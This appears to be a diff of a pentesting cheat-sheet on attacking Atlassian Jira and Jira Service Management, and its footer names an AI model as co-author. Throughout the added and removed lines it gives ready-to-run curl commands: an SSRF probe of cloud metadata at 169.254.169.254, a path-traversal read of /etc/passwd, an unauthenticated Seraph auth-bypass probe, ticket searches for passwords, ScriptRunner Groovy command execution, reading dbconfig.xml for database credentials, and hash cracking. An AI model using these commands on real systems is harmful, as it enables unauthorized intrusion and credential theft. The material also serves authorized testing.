@@ -1,6 +1,8 @@
 # Jira / Jira Service Management
 
-## What is it?
+#Jira #Atlassian #JSM #webservices #SSRF #RCE
+
+## What is Jira?
 Atlassian Jira — widely deployed project tracking and ticketing platform. Jira Service Management (formerly Service Desk) adds ITSM features. Attack surface: unauthenticated REST API access, SSRF via gadget proxy, SSTI/RCE via admin templates, auth bypass CVEs, credential harvesting from ticket content, and Script Runner Groovy execution.
 
 Deployment types:
@@ -17,6 +19,18 @@ Deployment types:
 | 8080 | TCP | Jira default HTTP |
 | 8443 | TCP | Jira default HTTPS |
 | 80/443 | TCP | Behind reverse proxy |
+
+---
+
+## Tools
+
+| Tool | Use |
+|---|---|
+| [[Tools/File Transfer/cURL\|cURL]] | REST API enum, SSRF (`makeRequest`), SSTI, path traversal, ScriptRunner RCE, ticket search |
+| [[Tools/Scanning/NMAP\|nmap]] | Port/version fingerprint (Jira favicon hash, `/serverInfo`) |
+| [[Tools/Auth/Hydra\|Hydra]] | Brute force `/rest/auth/1/session` |
+| [[Tools/Auth/hashcat\|hashcat]] | Crack Atlassian PBKDF2-SHA256 user hashes (`-m 12477`) |
+| [[Tools/Web/Burpsuite\|Burp Suite]] | Craft/replay CVE-2019-11581 SSTI and CVE-2022-0540 auth-bypass requests |
 
 ---
 
@@ -58,10 +72,10 @@ http.favicon.hash:"-1791346703"   # Jira favicon hash
 |-----|----------|-------------|--------|
 | CVE-2019-11581 | Server/DC < 8.4.0 | SSTI in email templates — admin or contact form | RCE |
 | CVE-2019-8451 | Server < 8.4.0 | SSRF via `/plugins/servlet/gadgets/makeRequest` | Pre-auth SSRF |
-| CVE-2022-0540 | Server/DC (various) | Auth bypass in Seraph — unauthenticated WebWork action access | Auth Bypass |
+| CVE-2022-0540 | Server/DC < 8.13.18/8.20.6/8.22.0 (JSM < 4.x equiv) | Seraph auth bypass — reach WebWork actions whose app sets roles-required only at the namespace level | Auth Bypass (unauth) |
 | CVE-2021-26086 | Server/DC < 8.15.0 | Path traversal — read arbitrary files without auth | Info Disc |
 | CVE-2022-26135 | Mobile plugin < 3.0 | Full read SSRF via mobile plugin endpoint | Pre-auth SSRF |
-| CVE-2021-39115 | JSM Data Center < 4.13.2 | Command injection in Jira Service Management | RCE |
+| CVE-2021-39115 | JSM Server/DC | SSTI in the Email Template feature (**Jira admin required**) → Java code exec | RCE (authed admin) |
 | CVE-2023-22501 | JSM Cloud | Broken auth — account takeover via email token | Account Takeover |
 
 ---
@@ -89,21 +103,19 @@ curl -sk "https://<target>/plugins/servlet/Wallboard/?dashboardId=10000&cyclePer
 ## CVE-2022-0540 — Authentication Bypass (Seraph)
 
 ```bash
-# Seraph auth bypass — access WebWork actions without authentication
-# Vulnerable: various Jira Server/DC versions
+# Seraph auth bypass — the flaw is per-app: it hits first/third-party apps that declare
+# roles-required at the webwork1 ACTION-NAMESPACE level but NOT at the individual action,
+# and where the action does no auth/authz of its own. So exploitability = which vulnerable
+# apps are installed. The widely-exploited target was Atlassian's own Insight app:
+curl -sk "https://<target>/secure/InsightPluginShowGeneralConfiguration.jspa"      # Insight config w/o auth
+curl -sk "https://<target>/rest/insight/1.0/config/statustype"                     # Insight REST reachable
 
-# Check if vulnerable — access an admin-only action without creds:
-curl -sk "https://<target>/secure/WsSingleSignOnSessionCreate.jspa"
-curl -sk "https://<target>/secure/admin/XsrfErrorPage.jspa"
+# General method: enumerate WebWork actions of installed apps and request them unauthenticated;
+# a 200 with real content (not a login redirect) on an action that should require a role = bypass.
+curl -skL -o /dev/null -w "%{http_code} %{url_effective}\n" \
+  "https://<target>/secure/<VulnerableAction>.jspa"
 
-# Bypass via URL manipulation (action name capitalization trick)
-curl -sk "https://<target>/secure/WsSingleSignOnSessionCreate!default.jspa"
-
-# Seraph bypass pattern — append suffix to action
-curl -sk "https://<target>/secure/ConfigurePortalPages!default.jspa%3bjsessionid=xxx"
-
-# Check if user enumeration possible via auth bypass
-curl -sk "https://<target>/rest/gadget/1.0/login?username=admin&password=test"
+# Confirm patched: fixed in 8.13.18 / 8.20.6 / 8.22.0 (JSM 4.13.18 / 4.20.6 / 4.22.0)
 ```
 
 ---
@@ -337,7 +349,7 @@ curl -sk -X POST "https://<target>/rest/api/2/issue" \
 
 ---
 
-## Dangerous Configurations
+## Dangerous Settings
 
 | Config | Risk |
 |--------|------|
@@ -355,29 +367,20 @@ curl -sk -X POST "https://<target>/rest/api/2/issue" \
 
 ## Quick Reference
 
-```bash
-# Version check (no auth)
-curl -sk https://<target>/rest/api/2/serverInfo | jq '{version:.version}'
+| Goal | Command |
+|---|---|
+| Version (no auth) | `curl -sk https://host/rest/api/2/serverInfo \| jq '{version:.version}'` |
+| User enum (no auth) | `curl -sk "https://host/rest/api/2/user/search?username=&maxResults=100" \| jq '.[].name'` |
+| CVE-2019-8451 SSRF | `curl -sk "https://host/plugins/servlet/gadgets/makeRequest?url=http://169.254.169.254/"` |
+| CVE-2022-0540 bypass | request a vulnerable app's WebWork action unauth (e.g. Insight `*.jspa`) |
+| CVE-2021-26086 file read | `curl -sk "https://host/s/x/_/%2F..%2F..%2Fetc/passwd" --path-as-is` |
+| Ticket cred search (authed) | `curl -sk "https://host/rest/api/2/search?jql=text~'password'" -H "Authorization: Basic <b64>"` |
+| ScriptRunner RCE (admin) | `POST /rest/scriptrunner/latest/custom/exec` `{"script":"[\"id\"].execute().text"}` |
+| DB creds (post-access) | read `<jira-home>/dbconfig.xml` (cleartext `<password>`) |
+| Crack Jira hashes | `hashcat -m 12477 hash rockyou.txt` |
 
-# User enum (no auth)
-curl -sk "https://<target>/rest/api/2/user/search?username=&maxResults=100" | jq '.[].name'
+---
 
-# CVE-2019-8451 SSRF
-curl -sk "https://<target>/plugins/servlet/gadgets/makeRequest?url=http://169.254.169.254/"
-
-# Search tickets for credentials (authenticated)
-curl -sk "https://<target>/rest/api/2/search?jql=text~'password'&maxResults=50" \
-  -H "Authorization: Basic $(echo -n 'user:pass' | base64)" | jq '.issues[].fields.summary'
-
-# Script Runner RCE (admin)
-curl -sk -X POST "https://<target>/rest/scriptrunner/latest/custom/exec" \
-  -H "Authorization: Basic $(echo -n 'admin:pass' | base64)" \
-  -H "Content-Type: application/json" \
-  -d '{"script":"[\"id\"].execute().text"}'
-
-# DB creds via Script Runner
-curl -sk -X POST "https://<target>/rest/scriptrunner/latest/custom/exec" \
-  -H "Authorization: Basic $(echo -n 'admin:pass' | base64)" \
-  -H "Content-Type: application/json" \
-  -d '{"script":"new File(\"/var/atlassian/application-data/jira/dbconfig.xml\").text"}'
-```
+*Created: 2026-07-13*
+*Updated: 2026-09-25*
+*Model: claude-opus-4-8*
